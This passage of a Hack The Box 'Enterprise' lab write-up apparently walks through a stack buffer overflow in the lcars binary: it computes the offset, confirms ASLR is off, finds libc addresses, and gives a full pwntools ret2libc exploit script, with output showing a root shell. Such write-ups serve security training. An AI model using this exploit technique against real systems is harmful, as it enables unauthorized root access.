+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000836 &lt;+98&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000837 &lt;+99&gt;:    call   0x5c0 &lt;__isoc99_scanf@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000083c &lt;+104&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000083f &lt;+107&gt;:    sub    esp,0x8
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000842 &lt;+110&gt;:    lea    eax,[ebp-0xd0]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000848 &lt;+116&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000849 &lt;+117&gt;:    lea    eax,[ebx-0x2138]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000084f &lt;+123&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000850 &lt;+124&gt;:    call   0x560 &lt;printf@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000855 &lt;+129&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000858 &lt;+132&gt;:    nop
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000859 &lt;+133&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000085c &lt;+136&gt;:    leave  
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000085d &lt;+137&gt;:    ret    
+</span></span></span><span class="line"><span class="cl"><span class="go">End of assembler dump.
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Let’s explain some things. In general, when we look at the disassembly code at the top of a function we’ll see something like this:
+</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">push</span>   <span class="no">ebp</span>                  <span class="err">//</span><span class="no">backup</span> <span class="no">caller</span><span class="err">'</span><span class="no">s</span> <span class="no">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>              <span class="err">//</span><span class="no">set</span> <span class="no">callee</span><span class="err">'</span><span class="no">s</span> <span class="no">ebp</span> <span class="no">to</span> <span class="no">esp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sub</span>    <span class="no">esp</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">some</span> <span class="no">number</span><span class="err">&gt;</span>   <span class="err">//</span><span class="no">stack</span> <span class="no">space</span> <span class="no">for</span> <span class="no">local</span> <span class="no">variables</span></span></span></code></pre></div><p></p>
+
+<p>The ebp register will point to the top of our stack for this frame, and esp will point to the next available byte on the stack (stacks typically grow downwards). Now, although we can try different string sizes to find out the correct size for our payload header, we can also try to calculate it. It is quite simple actually. We just find the difference between the numbers in commands that subtract from esp (sub esp, ) and those in commands that add to esp (add esp, ) till the call to __isoc99_scanf function.</p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000007d8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xd4</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000007ee</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000007fd</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000800</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000080f</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000081a</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000823</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000826</span> <span class="err">&lt;+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span></span></span></code></pre></div>
+
+<p>Therefore: 0xd4 + 0xc - 0x10 + 0xc - 0x10 + 0xc - 0x10 + 0x8 = 0xd0 = 208</p>
+
+<p>In order to overwrite the return address (i.e. eip) with our payload, we have to add 4 to account for pushing caller’s ebp into the stack. So our payload header will be 208+4 = 212. If you don’t know what I am talking about read this: <a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>
+
+<p>Now, let’s check if ASLR is enabled on the box:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /proc/sys/kernel/randomize_va_space
+</span></span><span class="line"><span class="cl"><span class="go">0
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Nice, ASLR is disabled. Now let’s find some useful addresses for our ret2libc payload:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">gdb /bin/lcars
+</span></span></span><span class="line"><span class="cl"><span class="go">(gdb) print &amp;system
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">(</span>&lt;text variable, no debug info&gt; *<span class="o">)</span> 0xf7e4c060 &lt;system&gt;
+</span></span><span class="line"><span class="cl"><span class="go">(gdb) print &amp;exit
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="o">(</span>&lt;text variable, no debug info&gt; *<span class="o">)</span> 0xf7e3faf0 &lt;exit&gt;
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">find &amp;system,+9999999,"/bin/sh"  
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f70a0f
+</span></span></span></code></pre></div></div><p></p>
+
+<p>If we try to use the address 0xf7f70a0f, it won’t work because it contains a newline ASCII code (0x0a). Depending on the context, the scanf() function either removes whitespace or stops reading after a whitespace.</p>
+
+<p>Let’s search for plain ‘sh’:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(gdb) find &amp;system,+9999999,"sh"       
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f6ddd5
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f6e7e1
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f70a14
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f72582
+</span></span></span></code></pre></div></div><p></p>
+
+<p>The address 0xf7f6ddd5 seems just fine.</p>
+
+<h2 id="autopwn-script">Autopwn script</h2>
+
+<p>Here is an autopwn script I wrote:
+</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">"10.10.10.61"</span>
+</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">32812</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'info'</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conv</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">"A"</span> <span class="o">*</span> <span class="mi">212</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e4c060</span><span class="p">)</span> <span class="c1"># system()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e3faf0</span><span class="p">)</span> <span class="c1"># exit()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7f6ddd5</span><span class="p">)</span> <span class="c1"># 'sh'</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Enter Bridge Access Code: "</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"picarda1"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Waiting for input: "</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"4"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Enter Security Override:"</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><p></p>
+
+<p>That’s all folks! :)</p>
+
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./pwn_lcars.py 
+</span></span><span class="line"><span class="cl"><span class="go">[+] Opening connection to 10.10.10.61 on port 32812: Done
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> whoami
+</span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span></code></pre></div></div>
+
+        </div>
+
+        <aside>
+          <div class="p-share centered">
+            <a href="https://www.buymeacoffee.com/alamot" onclick="window.open(this.href, &#39;PCwindow&#39;, &#39;width=550, height=350, menubar=no, toolbar=no, scrollbars=yes&#39;); return false;"><i class="fa fa-coffee"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&amp;u=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&amp;t=Enterprise%20%28Hack%20The%20Box%29%20write-up" onclick="window.open(this.href, &#39;PCwindow&#39;, &#39;width=550, height=350, menubar=no, toolbar=no, scrollbars=yes&#39;); return false;"><i class="fa fa-facebook"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&amp;text=Enterprise%20%28Hack%20The%20Box%29%20write-up&amp;tw_p=tweetbutton" onclick="window.open(this.href, &#39;PCwindow&#39;, &#39;width=550, height=350, menubar=no, toolbar=no, scrollbars=yes&#39;); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&amp;text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Enterprise%20%28Hack%20The%20Box%29&amp;tw_p=tweetbutton" onclick="window.open(this.href, &#39;PCwindow&#39;, &#39;width=550, height=350, menubar=no, toolbar=no, scrollbars=yes&#39;); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&amp;description=Enterprise%20%28Hack%20The%20Box%29%20write-up&amp;media=https://alamot.github.io/images/space.jpg" onclick="window.open(this.href, &#39;PCwindow&#39;, &#39;width=550, height=350, menubar=no, toolbar=no, scrollbars=yes&#39;); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&amp;description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Enterprise%20%28Hack%20The%20Box%29&amp;media=https://alamot.github.io/images/space.jpg" onclick="window.open(this.href, &#39;PCwindow&#39;, &#39;width=550, height=350, menubar=no, toolbar=no, scrollbars=yes&#39;); return false;"><i class="fa fa-pinterest-p"></i></a>
+          </div>
+        </aside>
+      </article>
+      
+      <section id="posts-section">
+        <header lang="en"><h3>See also...</h3></header>
+        <header lang="el"><h3>Δείτε επίσης...</h3></header>
+        <div>
+          
+          
+          
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot's matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
